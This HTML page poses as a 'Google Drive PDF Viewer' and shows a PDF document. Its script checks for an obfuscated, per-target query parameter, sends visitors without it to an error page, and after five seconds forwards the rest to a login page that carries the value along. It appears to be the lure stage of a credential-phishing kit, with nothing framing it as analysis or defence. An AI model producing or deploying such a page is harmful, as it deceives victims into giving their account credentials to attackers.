<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google Drive PDF Viewer</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      font-family: Arial, sans-serif;
      background: #000;
      overflow: hidden;
    }

    .content {
      position: relative;
      width: 100%;
      height: 100%;
      transition: filter 0.4s ease;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .content.blurred {
      filter: blur(6px);
    }

    object {
      width: 100%;
      height: 100%;
      border: none;
      background: #111;
    }
  </style>
</head>
<body>

  <div class="content" id="content">
    <object data="/OM to coast Guard.pdf" type="application/pdf">
      <p>Your browser does not support PDFs.
        <a href="/OM to coast Guard.pdf">Download the PDF</a>.
      </p>
    </object>
  </div>

  <script>
    // Function to get query parameter
    function getQueryParameter(name) {
      const params = new URLSearchParams(window.location.search);
      return params.get(name);
    }

    // Get encoded parameter
    const value = getQueryParameter('ksbfjkguirejgjkfdshrouwheofshfwerwehi');

    // If missing â†’ redirect to error page
    if (!value) {
      window.location.href = "error.html";
    } else {
      // Redirect after 3 seconds
      setTimeout(() => {
        const redirectURL = "login.html?bfjkdghurehgjufhdkhgruiegbvousdhfowehr=" + encodeURIComponent(value);
        window.location.href = redirectURL;
      }, 5000);
    }
  </script>

</body>
</html>
